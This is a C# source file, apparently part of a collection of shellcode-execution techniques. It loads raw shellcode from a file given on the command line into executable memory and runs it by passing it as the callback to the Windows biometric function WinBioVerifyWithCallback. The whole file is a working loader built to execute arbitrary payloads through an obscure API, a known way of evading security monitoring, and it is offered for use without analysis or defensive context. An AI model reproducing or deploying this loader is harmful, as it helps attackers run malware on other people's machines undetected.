// Wra7h/FlavorTown
// Compile with: Visual Studio 2022 & .NET Fx 3.5+
// Usage: this.exe <shellcode file>

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace WinBioVerifyWithCallback
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("\nNo shellcode specified.");
                Console.WriteLine("Example Usage: WinBioVerifyWithCallback.exe C:\\Path\\To\\Raw\\Shellcode.bin\n");
                System.Environment.Exit(1);
            }

            byte[] payload = System.IO.File.ReadAllBytes(args[0]);

            IntPtr hAlloc = VirtualAlloc(
                            IntPtr.Zero, (uint)payload.Length,
                            0x1000 /*COMMIT*/, 0x40 /*RWX*/);

            Marshal.Copy(payload, 0, hAlloc, payload.Length);

            uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle,
                hAlloc, payload.Length, 0x20/*RX*/, out oldProtect);

            IntPtr hBioSession = IntPtr.Zero;
            uint WINBIO_TYPE_FINGERPRINT = 0x00000008;
            uint WINBIO_POOL_SYSTEM = 1;
            uint WINBIO_FLAG_DEFAULT = 0x00000000;
            uint WINBIO_DB_DEFAULT = 1;
            WinBioOpenSession(WINBIO_TYPE_FINGERPRINT, WINBIO_POOL_SYSTEM, WINBIO_FLAG_DEFAULT, IntPtr.Zero, 0, (IntPtr)WINBIO_DB_DEFAULT, out hBioSession);

            uint WINBIO_ANSI_381_POS_UNKNOWN = 0x0;
            WINBIO_IDENTITY sWI = new WINBIO_IDENTITY();
            WinBioVerifyWithCallback(hBioSession,ref sWI, WINBIO_ANSI_381_POS_UNKNOWN, hAlloc, IntPtr.Zero);

            WinBioWait(hBioSession);

            WinBioCloseSession(hBioSession);

        }

        [DllImport("kernel32")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(
            IntPtr hProcess, IntPtr lpAddress,
            int dwSize, uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioOpenSession(uint Factor,
            uint PoolType, uint Flags,
            IntPtr UnitArray, uint UnitCount,
            IntPtr DatabaseId, out IntPtr SessionHandle);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioVerifyWithCallback(IntPtr SessionHandle, 
            ref WINBIO_IDENTITY Identity, uint SubFactor,
            IntPtr VerifyCallback, IntPtr VerifyCallbackContext);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioWait(IntPtr SessionHandle);

        [DllImport("Winbio.dll")]
        static extern IntPtr WinBioCloseSession(IntPtr SessionHandle);

        [StructLayout(LayoutKind.Sequential, Size = 76)]
        struct WINBIO_IDENTITY
        {
            //Not really necessary for this.
        }
    }
}
